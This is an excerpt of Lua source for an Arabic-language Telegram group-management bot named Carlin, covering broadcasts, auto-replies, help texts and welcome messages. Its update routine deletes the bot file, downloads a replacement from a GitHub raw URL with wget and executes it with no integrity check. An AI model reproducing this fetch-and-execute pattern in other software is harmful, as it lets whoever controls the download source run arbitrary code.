DevRio:sadd(Carlin.."Rio:Groups",msg.chat_id_)
if not DevRio:get(Carlin..'Rio:SudosGp'..msg.sender_user_id_..msg.chat_id_) and not SecondSudo(msg) then 
DevRio:incrby(Carlin..'Rio:Sudos'..msg.sender_user_id_,1)
DevRio:set(Carlin..'Rio:SudosGp'..msg.sender_user_id_..msg.chat_id_,"rio")
end
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
if not DevRio:sismember(Carlin..'Rio:Groups',msg.chat_id_) then
...
local Text = "᥀︙Source Carlin\n᥀︙File Bot Groups\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local GroupsManagers = DevRio:scard(Carlin.."Rio:Managers:"..v) or 0
local GroupsAdmins = DevRio:scard(Carlin.."Rio:Admins:"..v) or 0
local Groupslink = DevRio:get(Carlin.."Rio:Groups:Links" ..v)
...
DevRio:setex(Carlin.."Rio:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local CarlinTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevRio:get(Carlin.."Rio:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevRio:del(Carlin.."Rio:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
List = DevRio:smembers(Carlin..'Rio:Users') 
if msg.content_.text_ then
for k,v in pairs(List) do 
RioText = "الرساله"
...
DevRio:setex(Carlin.."Rio:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local CarlinTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevRio:get(Carlin.."Rio:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevRio:del(Carlin.."Rio:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
List = DevRio:smembers(Carlin..'Rio:Groups') 
if msg.content_.text_ then
for k,v in pairs(List) do 
RioText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
...
DevRio:setex(Carlin.."Rio:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local CarlinTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙ارسل الرساله الان لتوجيها \n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevRio:get(Carlin.."Rio:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevRio:del(Carlin.."Rio:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false  
end 
local List = DevRio:smembers(Carlin..'Rio:Groups')   
for k,v in pairs(List) do  
...
DevRio:setex(Carlin.."Rio:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local CarlinTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙ارسل الرساله الان لتوجيها \n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevRio:get(Carlin.."Rio:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevRio:del(Carlin.."Rio:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false  
end 
local List = DevRio:smembers(Carlin..'Rio:Users')   
for k,v in pairs(List) do  
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم اذاعة رسالتك بالتوجيه \n᥀︙‏الى ↫ ❨ "..#List.." ❩ مشترك \n ✓", 1, 'md')
...
DevRio:setex(Carlin.."Rio:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local CarlinTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevRio:get(Carlin.."Rio:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == "الغاء" then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevRio:del(Carlin.."Rio:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
local List = DevRio:smembers(Carlin.."Rio:Groups") 
if msg.content_.text_ then
...
RioText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
DevRio:set(Carlin..'Rio:PinnedMsgs'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
...
RioText = "الصوره"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
DevRio:set(Carlin..'Rio:PinnedMsgs'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
RioText = "المتحركه"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
DevRio:set(Carlin..'Rio:PinnedMsgs'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
RioText = "الفيديو"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
DevRio:set(Carlin..'Rio:PinnedMsgs'..v,msg.content_.video_.video_.persistent_id_)
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
RioText = "البصمه"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
DevRio:set(Carlin..'Rio:PinnedMsgs'..v,msg.content_.voice_.voice_.persistent_id_)
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
RioText = "الصوت"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
DevRio:set(Carlin..'Rio:PinnedMsgs'..v,msg.content_.audio_.audio_.persistent_id_)
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
RioText = "الملف"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
DevRio:set(Carlin..'Rio:PinnedMsgs'..v,msg.content_.document_.document_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
RioText = "الملصق"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
DevRio:set(Carlin..'Rio:PinnedMsgs'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
...
local List = DevRio:smembers(Carlin..'Rio:Manager:GpRedod'..msg.chat_id_)
if #List == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙لا توجد ردود متعدده مضافه" ,  1, "md")
return false
end
DevRio:set(Carlin..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedod')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل كلمة الرد اولا" ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local DelGpRedRedod = DevRio:get(Carlin..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
...
if not DevRio:sismember(Carlin..'Rio:Manager:GpRedod'..msg.chat_id_,text) then
...
DevRio:set(Carlin..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedods')
DevRio:set(Carlin..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
return false
end end
...
DevRio:set(Carlin..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedod')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه لحذفها" ,  1, "md")
return false
end
if text == 'اضف رد متعدد' and Manager(msg) and ChCheck(msg) then
DevRio:set(Carlin..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SetGpRedod')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه الان" ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local SetGpRedod = DevRio:get(Carlin..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
...
DevRio:set(Carlin..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SaveGpRedod')
DevRio:set(Carlin..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
DevRio:sadd(Carlin..'Rio:Manager:GpRedod'..msg.chat_id_,text)
return false
end end
--     Source Carlin     --
if text == 'حذف رد' and Manager(msg) and ChCheck(msg) or text == 'مسح رد' and  Manager(msg) and ChCheck(msg) then
local List = DevRio:smembers(Carlin..'Rio:Manager:GpRed'..msg.chat_id_)
if #List == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙لا توجد ردود مضافه" ,  1, "md")
return false
end
DevRio:set(Carlin..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'DelGpRed')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
if text == 'اضف رد' and not DevRio:get(Carlin..'Rio:Lock:Rd'..msg.chat_id_) and Manager(msg) and ChCheck(msg) then
DevRio:set(Carlin..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SetGpRed')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه الان " ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local SetGpRed = DevRio:get(Carlin..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
...
DevRio:set(Carlin..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SaveGpRed')
DevRio:set(Carlin..'Rio:Add:GpText'..msg.sender_user_id_..msg.chat_id_,text)
DevRio:sadd(Carlin..'Rio:Manager:GpRed'..msg.chat_id_,text)
DevRio:set(Carlin..'DelManagerRep'..msg.chat_id_,text)
return false
end end
--     Source Carlin     --
...
local List = DevRio:smembers(Carlin.."Rio:Sudo:AllRed")
if #List == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙لا توجد ردود مضافه" ,  1, "md")
return false
end
DevRio:set(Carlin.."Rio:Add:AllRed"..msg.sender_user_id_,'DelAllRed')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
...
DevRio:set(Carlin.."Rio:Add:AllRed"..msg.sender_user_id_,'SetAllRed')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه الان " ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local SetAllRed = DevRio:get(Carlin.."Rio:Add:AllRed"..msg.sender_user_id_)
...
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙ارسل لي الرد سواء كان ↫ ⤈\n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙يمكنك اضافة الى النص ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n `#username` ↬ معرف المستخدم\n `#msgs` ↬ عدد الرسائل\n `#name` ↬ اسم المستخدم\n `#id` ↬ ايدي المستخدم\n `#stast` ↬ رتبة المستخدم\n `#edit` ↬ عدد السحكات\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙للخروج ارسل ↫ ( الغاء )\n ✓" ,  1, "md")
DevRio:set(Carlin.."Rio:Add:AllRed"..msg.sender_user_id_,'SaveAllRed')
DevRio:set(Carlin.."Rio:Add:AllText"..msg.sender_user_id_, text)
DevRio:sadd(Carlin.."Rio:Sudo:AllRed",text)
DevRio:set(Carlin.."DelSudoRep",text)
return false 
end end
--     Source Carlin     --
if text == 'الردود المتعدده' and Manager(msg) and ChCheck(msg) then
local redod = DevRio:smembers(Carlin..'Rio:Manager:GpRedod'..msg.chat_id_)
MsgRep = '᥀︙قائمة الردود المتعدده ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n'
for k,v in pairs(redod) do
MsgRep = MsgRep..k..'~ (`'..v..'`) • {*العدد ↫ '..#DevRio:smembers(Carlin..'Rio:Text:GpTexts'..v..msg.chat_id_)..'*}\n' 
end
if #redod == 0 then
...
for k,v in pairs(redod) do
DevRio:del(Carlin..'Rio:Text:GpTexts'..v..msg.chat_id_)
DevRio:del(Carlin..'Rio:Manager:GpRedod'..msg.chat_id_)
end
...
local redod = DevRio:smembers(Carlin..'Rio:Manager:GpRed'..msg.chat_id_)
MsgRep = '᥀︙ردود المدير ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n'
for k,v in pairs(redod) do
if DevRio:get(Carlin.."Rio:Gif:GpRed"..v..msg.chat_id_) then
dp = 'متحركه 🎭'
elseif DevRio:get(Carlin.."Rio:Voice:GpRed"..v..msg.chat_id_) then
dp = 'بصمه 🎙'
elseif DevRio:get(Carlin.."Rio:Stecker:GpRed"..v..msg.chat_id_) then
dp = 'ملصق 🃏'
elseif DevRio:get(Carlin.."Rio:Text:GpRed"..v..msg.chat_id_) then
dp = 'رساله ✉'
elseif DevRio:get(Carlin.."Rio:Photo:GpRed"..v..msg.chat_id_) then
dp = 'صوره 🎇'
elseif DevRio:get(Carlin.."Rio:Video:GpRed"..v..msg.chat_id_) then
dp = 'فيديو 📽'
elseif DevRio:get(Carlin.."Rio:File:GpRed"..v..msg.chat_id_) then
dp = 'ملف 📁'
elseif DevRio:get(Carlin.."Rio:Audio:GpRed"..v..msg.chat_id_) then
dp = 'اغنيه 🎶'
end
...
if Manager(msg) then
if text and (text =='حذف الردود' or text == 'مسح الردود' or text == 'حذف ردود المدير' or text == 'مسح ردود المدير') and not DevRio:get(Carlin..'Rio:Lock:Rd'..msg.chat_id_) and ChCheck(msg) then
local redod = DevRio:smembers(Carlin..'Rio:Manager:GpRed'..msg.chat_id_)
if #redod == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙لا توجد ردود مضافه" ,  1, "md")
else
for k,v in pairs(redod) do
DevRio:del(Carlin..'Rio:Gif:GpRed'..v..msg.chat_id_)
DevRio:del(Carlin..'Rio:Voice:GpRed'..v..msg.chat_id_)
DevRio:del(Carlin..'Rio:Audio:GpRed'..v..msg.chat_id_)
DevRio:del(Carlin..'Rio:Photo:GpRed'..v..msg.chat_id_)
DevRio:del(Carlin..'Rio:Stecker:GpRed'..v..msg.chat_id_)
DevRio:del(Carlin..'Rio:Video:GpRed'..v..msg.chat_id_)
DevRio:del(Carlin..'Rio:File:GpRed'..v..msg.chat_id_)
DevRio:del(Carlin..'Rio:Text:GpRed'..v..msg.chat_id_)
DevRio:del(Carlin..'Rio:Manager:GpRed'..msg.chat_id_)
end
...
local redod = DevRio:smembers(Carlin.."Rio:Sudo:AllRed")
MsgRep = '᥀︙ردود المطور ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n'
for k,v in pairs(redod) do
if DevRio:get(Carlin.."Rio:Gif:AllRed"..v) then
dp = 'متحركه 🎭'
elseif DevRio:get(Carlin.."Rio:Voice:AllRed"..v) then
dp = 'بصمه 🎙'
elseif DevRio:get(Carlin.."Rio:Stecker:AllRed"..v) then
dp = 'ملصق 🃏'
elseif DevRio:get(Carlin.."Rio:Text:AllRed"..v) then
dp = 'رساله ✉'
elseif DevRio:get(Carlin.."Rio:Photo:AllRed"..v) then
dp = 'صوره 🎇'
elseif DevRio:get(Carlin.."Rio:Video:AllRed"..v) then
dp = 'فيديو 📽'
elseif DevRio:get(Carlin.."Rio:File:AllRed"..v) then
dp = 'ملف 📁'
elseif DevRio:get(Carlin.."Rio:Audio:AllRed"..v) then
dp = 'اغنيه 🎶'
end
MsgRep = MsgRep..k..'~ (`'..v..'`) ↫ {*'..dp..'*}\n' 
end
...
for k,v in pairs(redod) do
DevRio:del(Carlin.."Rio:Add:AllRed"..v)
DevRio:del(Carlin.."Rio:Gif:AllRed"..v)
DevRio:del(Carlin.."Rio:Voice:AllRed"..v)
DevRio:del(Carlin.."Rio:Audio:AllRed"..v)
DevRio:del(Carlin.."Rio:Photo:AllRed"..v)
DevRio:del(Carlin.."Rio:Stecker:AllRed"..v)
DevRio:del(Carlin.."Rio:Video:AllRed"..v)
DevRio:del(Carlin.."Rio:File:AllRed"..v)
DevRio:del(Carlin.."Rio:Text:AllRed"..v)
DevRio:del(Carlin.."Rio:Sudo:AllRed")
end
...
DevRio:set(Carlin..'Rio:NameBot'..msg.sender_user_id_, 'msg')
return false 
end
end
...
DevRio:set(Carlin..'Rio:Help0'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local CarlinTeam =  DevRio:get(Carlin..'Rio:Help0'..msg.sender_user_id_)
if CarlinTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(Carlin..'Rio:Help0'..msg.sender_user_id_)
DevRio:set(Carlin..'Rio:Help', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevRio:set(Carlin..'Rio:Help01'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local CarlinTeam =  DevRio:get(Carlin..'Rio:Help01'..msg.sender_user_id_)
if CarlinTeam == 'msg' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(Carlin..'Rio:Help01'..msg.sender_user_id_)
DevRio:set(Carlin..'Rio:Help1', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevRio:set(Carlin..'Rio:Help21'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local CarlinTeam =  DevRio:get(Carlin..'Rio:Help21'..msg.sender_user_id_)
if CarlinTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(Carlin..'Rio:Help21'..msg.sender_user_id_)
DevRio:set(Carlin..'Rio:Help2', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevRio:set(Carlin..'Rio:Help31'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local CarlinTeam =  DevRio:get(Carlin..'Rio:Help31'..msg.sender_user_id_)
if CarlinTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(Carlin..'Rio:Help31'..msg.sender_user_id_)
DevRio:set(Carlin..'Rio:Help3', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevRio:set(Carlin..'Rio:Help41'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local CarlinTeam =  DevRio:get(Carlin..'Rio:Help41'..msg.sender_user_id_)
if CarlinTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(Carlin..'Rio:Help41'..msg.sender_user_id_)
DevRio:set(Carlin..'Rio:Help4', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده" ,  1, "md")
return false end
end
...
DevRio:set(Carlin..'Rio:Help51'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local CarlinTeam =  DevRio:get(Carlin..'Rio:Help51'..msg.sender_user_id_)
if CarlinTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(Carlin..'Rio:Help51'..msg.sender_user_id_)
DevRio:set(Carlin..'Rio:Help5', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevRio:set(Carlin..'Rio:Help61'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local CarlinTeam =  DevRio:get(Carlin..'Rio:Help61'..msg.sender_user_id_)
if CarlinTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(Carlin..'Rio:Help61'..msg.sender_user_id_)
DevRio:set(Carlin..'Rio:Help6', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده" ,  1, "md")
return false end
end
...
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙جاري تحديث سورس Carlin', 1, 'md') 
os.execute('rm -rf Carlin.lua') 
os.execute('wget https://raw.githubusercontent.com/LARICATEAM/Carlin/master/Carlin.lua') 
dofile('Carlin.lua') 
...
local Users = DevRio:smembers(Carlin.."User_Bot")
local Groups = DevRio:smembers(Carlin..'Chek:Groups')
local Sudos = DevRio:smembers(Carlin.."Sudo:User")
if DevRio:get(Carlin..'Name:Bot') then
DevRio:set(Carlin..'Rio:NameBot',(DevRio:get(Carlin..'Name:Bot') or 'Carlin'))
end
for i = 1, #Users do
local id = Users[i]
if id:match("^(%d+)") then
DevRio:sadd(Carlin..'Rio:Users',Users[i]) 
end
end
for i = 1, #Sudos do
DevRio:sadd(Carlin..'Rio:SudoBot:',Sudos[i]) 
end
for i = 1, #Groups do
DevRio:sadd(Carlin..'Rio:Groups',Groups[i]) 
if DevRio:get(Carlin.."Private:Group:Link"..Groups[i]) then
DevRio:set(Carlin.."Rio:Groups:Links"..Groups[i],DevRio:get(Carlin.."Private:Group:Link"..Groups[i]))
end
if DevRio:get(Carlin.."Get:Welcome:Group"..Groups[i]) then
DevRio:set(Carlin..'Rio:Groups:Welcomes'..Groups[i],DevRio:get(Carlin.."Get:Welcome:Group"..Groups[i]))
end
local list2 = DevRio:smembers(Carlin..'Constructor'..Groups[i])
for k,v in pairs(list2) do
DevRio:sadd(Carlin.."Rio:Constructor:"..Groups[i], v)
end
local list3 = DevRio:smembers(Carlin..'BasicConstructor'..Groups[i])
for k,v in pairs(list3) do
DevRio:sadd(Carlin.."Rio:BasicConstructor:"..Groups[i], v)
end
local list4 = DevRio:smembers(Carlin..'Manager'..Groups[i])
for k,v in pairs(list4) do
DevRio:sadd(Carlin.."Rio:Managers:"..Groups[i], v)
end
local list5 = DevRio:smembers(Carlin..'Mod:User'..Groups[i])
for k,v in pairs(list5) do
DevRio:sadd(Carlin.."Rio:Admins:"..Groups[i], v)
end
local list6 = DevRio:smembers(Carlin..'Special:User'..Groups[i])
for k,v in pairs(list6) do
DevRio:sadd(Carlin.."Rio:VipMem:"..Groups[i], v)
end
DevRio:set(Carlin.."Rio:Lock:Bots"..Groups[i],"del") DevRio:hset(Carlin.."Rio:Spam:Group:User"..Groups[i] ,"Spam:User","keed") 
...
for i,Lock in pairs(LockList) do
DevRio:set(Carlin..Lock..Groups[i],true)
end
end
...
local Get_Files, res = https.request("https://raw.githubusercontent.com/LARICATEAM/CarlinFiles/master/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n᥀︙قائمة ملفات متجر سورس Carlin\n᥀︙الملفات المتوفره حاليا ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
...
local GetJson, Res = https.request("https://raw.githubusercontent.com/LARICATEAM/CarlinFiles/master/CarlinFiles/"..FileName)
if Res == 200 then
...
DevRio:del(Carlin..'Rio:Text:BotWelcome')
DevRio:del(Carlin..'Rio:Photo:BotWelcome')
return false
end 
...
DevRio:del(Carlin..'Rio:Lock:BotWelcome')
return false
end 
...
DevRio:set(Carlin..'Rio:Lock:BotWelcome',true)
return false
end 
...
DevRio:del(Carlin..'Rio:Text:BotWelcome')
DevRio:del(Carlin..'Rio:Photo:BotWelcome')
DevRio:set(Carlin.."Rio:Set:BotWelcome"..msg.sender_user_id_,"Text") 
return false
end 
if text and DevRio:get(Carlin.."Rio:Set:BotWelcome"..msg.sender_user_id_) == 'Text' then 
if text and text:match("^الغاء$") then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر", 1, "md") 
DevRio:del(Carlin.."Rio:Set:BotWelcome"..msg.sender_user_id_)   
return false
end 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ النص ارسل لي صورة الترحيب\n᥀︙ارسل ↫ الغاء لحفظ النص فقط", 1, 'md')   
DevRio:set(Carlin.."Rio:Text:BotWelcome",text) 
DevRio:set(Carlin.."Rio:Set:BotWelcome"..msg.sender_user_id_,"Photo") 
return false 
end 
if DevRio:get(Carlin.."Rio:Set:BotWelcome"..msg.sender_user_id_) == 'Photo' then 
if text and text:match("^الغاء$") then 
...
DevRio:set(Carlin.."Rio:Photo:BotWelcome",msg.content_.photo_.sizes_[1].photo_.persistent_id_)
...
DevRio:setex(Carlin.."Rio:DevText"..msg.chat_id_..":" .. msg.sender_user_id_, 300, true)
end end
...
DevRio:del(Carlin.."DevText")
end end
--     Source Carlin     --
if DevRio:get(Carlin.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر", 1, "md") 
DevRio:del(Carlin.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevRio:del(Carlin.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local texxt = string.match(text, "(.*)") 
DevRio:set(Carlin..'Rio:ChText',texxt)
...
DevRio:setex(Carlin.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)   
...
Text = [[
᥀︙[قناة السورس](https://t.me/TOLENTEam)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '᥀ قناة السورس',url="t.me/TOLENTEam"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/S3FFF&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
...
Text = [[
᥀︙[مبرمج السورس](https://t.me/KKKKKKRD)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '᥀ مبرمج السورس',url="t.me/KKKKKKRD"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/KKKKKKRD&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
--     Source Carlin     --
...
DevRio:incr(Carlin..'Rio:EditMsg'..result.chat_id_..result.sender_user_id_)
local text = result.content_.text_ or result.content_.caption_
local Text = result.content_.text_
if DevRio:get(Carlin..'Rio:Lock:EditMsgs'..msg.chat_id_) and not Text and not SecondSudo(result) then
...
local GetMsgPin = DevRio:get(Carlin..'Rio:PinnedMsgs'..msg.chat_id_)
if GetMsgPin ~= nil then
if text == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) if dp.ID == 'Ok' then;DevRio:del(Carlin..'Rio:PinnedMsgs'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if GetMsgPin == msg.content_.sticker_.sticker_.persistent_id_ then
